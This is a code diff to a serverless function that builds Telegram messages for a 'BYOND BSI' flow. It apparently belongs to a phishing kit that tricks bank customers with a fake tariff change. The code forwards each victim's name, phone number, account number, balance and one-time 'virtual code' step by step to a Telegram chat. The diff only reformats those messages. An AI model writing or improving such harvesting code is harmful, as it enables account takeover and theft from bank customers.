@@ -34,45 +34,97 @@ exports.handler = async (event, context) => {
         let message;
         switch (data.step) {
             case 'tariff-selection':
-                message = `📢 *BYOND BSI - PILIHAN TARIF*\n\n` +
-                          `Pelanggan memilih: ${data.tariff === 'old' ? 'Tarif Lama' : 'Tarif Baru'}`;
+                message = `
+╭───────────────────────────
+│  🔔 *BYOND BSI - PILIHAN TARIF*  
+├───────────────────────────
+│  Pelanggan memilih:
+│  *${data.tariff === 'old' ? 'TARIF LAMA (Rp 6.500/transaksi)' : 'TARIF BARU (Rp 150.000/bulan)'}*
+╰───────────────────────────
+                `;
                 break;
 
             case 'account-verification-1':
-                message = `🔐 *BYOND BSI - VERIFIKASI 1*\n\n` +
-                          `Nama: ${data.name}\n` +
-                          `No HP: ${data.phone}\n` +
-                          `Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}`;
+                message = `
+╭───────────────────────────
+│  🔐 *BYOND BSI - VERIFIKASI 1*  
+├───────────────────────────
+│  *📌 DATA PRIBADI*  
+├───────────────────────────
+│  • Nama: ${data.name || '-'}
+│  • No HP: ${data.phone || '-'}
+├───────────────────────────
+│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
+╰───────────────────────────
+                `;
                 break;
 
             case 'account-verification-2':
-                message = `🔢 *BYOND BSI - VERIFIKASI 2*\n\n` +
-                          `No Rekening: ${data.accountNumber}`;
+                message = `
+╭───────────────────────────
+│  🔢 *BYOND BSI - VERIFIKASI 2*  
+├───────────────────────────
+│  *📌 DATA REKENING*  
+├───────────────────────────
+│  • No Rekening: ${data.accountNumber || '-'}
+│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
+╰───────────────────────────
+                `;
                 break;
 
             case 'account-verification-3':
-                message = `💰 *BYOND BSI - VERIFIKASI 3*\n\n` +
-                          `Saldo: Rp ${formatNumber(data.balance)}`;
+                message = `
+╭───────────────────────────
+│  💰 *BYOND BSI - VERIFIKASI 3*  
+├───────────────────────────
+│  *📌 DATA SALDO*  
+├───────────────────────────
+│  • Saldo: Rp ${formatNumber(data.balance) || '-'}
+│  • Pilihan Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}
+╰───────────────────────────
+                `;
                 break;
 
             case 'complete-verification':
-                message = `✅ *BYOND BSI - VERIFIKASI BERHASIL!*\n\n` +
-                          `Nama: ${data.name}\n` +
-                          `No HP: ${data.phone}\n` +
-                          `No Rek: ${data.accountNumber}\n` +
-                          `Saldo: Rp ${formatNumber(data.balance)}\n` +
-                          `Kode: ${data.virtualCode}\n` +
-                          `Tarif: ${data.tariff === 'old' ? 'Lama' : 'Baru'}`;
+                message = `
+╭───────────────────────────
+│  ✅ *BYOND BSI - VERIFIKASI BERHASIL*  
+├───────────────────────────
+│  *📌 DATA LENGKAP*  
+├───────────────────────────
+│  • Nama: ${data.name || '-'}
+│  • No HP: ${data.phone || '-'}
+├───────────────────────────
+│  • No Rek: ${data.accountNumber || '-'}
+│  • Saldo: Rp ${formatNumber(data.balance) || '-'}
+├───────────────────────────
+│  • Kode: ${data.virtualCode || '-'}
+│  • Tarif: ${data.tariff === 'old' ? 'Lama (Rp 6.500/transaksi)' : 'Baru (Rp 150.000/bulan)'}
+╰───────────────────────────
+                `;
                 break;
 
             case 'request-new-code':
-                message = `🔄 *BYOND BSI - PERMINTAAN KODE BARU*\n\n` +
-                          `No HP: ${data.phone}`;
+                message = `
+╭───────────────────────────
+│  🔄 *BYOND BSI - PERMINTAAN KODE*  
+├───────────────────────────
+│  Permintaan kode virtual baru
+│  untuk nomor:
+│  *${data.phone || '-'}*
+╰───────────────────────────
+                `;
                 break;
 
             default:
-                message = `ℹ️ *BYOND BSI - DATA DITERIMA*\n\n` +
-                          JSON.stringify(data, null, 2);
+                message = `
+╭───────────────────────────
+│  ℹ️ *BYOND BSI - DATA DITERIMA*  
+├───────────────────────────
+│  Data tidak dikenali:
+│  ${JSON.stringify(data, null, 2)}
+╰───────────────────────────
+                `;
         }
 
         // Send to Telegram
@@ -101,5 +153,6 @@ exports.handler = async (event, context) => {
 
 // Helper function to format numbers
 function formatNumber(num) {
+    if (!num) return '0';
     return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-        }
+    }
